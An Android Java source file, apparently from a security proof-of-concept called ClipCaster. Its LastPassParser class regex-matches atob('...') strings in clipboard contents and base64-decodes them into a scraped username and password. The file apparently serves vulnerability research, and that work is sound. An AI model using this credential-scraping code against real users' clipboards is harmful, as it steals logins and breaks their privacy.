/*
 * Copyright (c) 2014 Xiao Bao Clark
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this
 *    list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 *    this list of conditions and the following disclaimer in the documentation
 *    and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
 * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
 * ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 * The views and conclusions contained in the software and documentation are those
 * of the authors and should not be interpreted as representing official policies,
 * either expressed or implied, of the FreeBSD Project.
 */

package com.actisec.clipcaster.parser;

import android.content.Context;
import android.util.Base64;

import com.actisec.clipcaster.ScrapedCredentials;
import com.actisec.clipcaster.ScrapedData;
import com.actisec.clipcaster.Source;

import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Created by xiao on 11/11/14.
 */
public class LastPassParser extends AbstractClipParser {

    @Override
    ScrapedData getScrapedData(Context context, String contents) {
        return sGetData(contents);
    }

    public static String REGEX = "atob\\(\\'([^']*)\\'\\)";
    public static ScrapedData sGetData(String string){
        long timeOfEntry = System.currentTimeMillis();
        Pattern p = Pattern.compile(REGEX);
        //  get a matcher object
        Matcher m = p.matcher(string);
        List<String> creds = new ArrayList<String>(2);
        while(m.find()) {
            creds.add(m.group(1));
        }
        if(creds.isEmpty()) return null;
        ScrapedData result = new ScrapedData();
        result.creds = new ScrapedCredentials(new String(Base64.decode(creds.get(0).getBytes(), 0)),new String(Base64.decode(creds.get(1).getBytes(), 0)));
        if(!sCheckString(result.creds.user) || !sCheckString(result.creds.pass)){
            result.creds = null;
        }
        result.source = new Source(string,timeOfEntry);
        return result;
    }

    public static boolean sCheckString(String toCheck){
        char[] array = toCheck.toCharArray();
        for (int i = 0; i < array.length; i++) {
            char c = array[i];
            if(c < 33 || c > 126){
                return false;
            }
        }
        return true;
    }
}
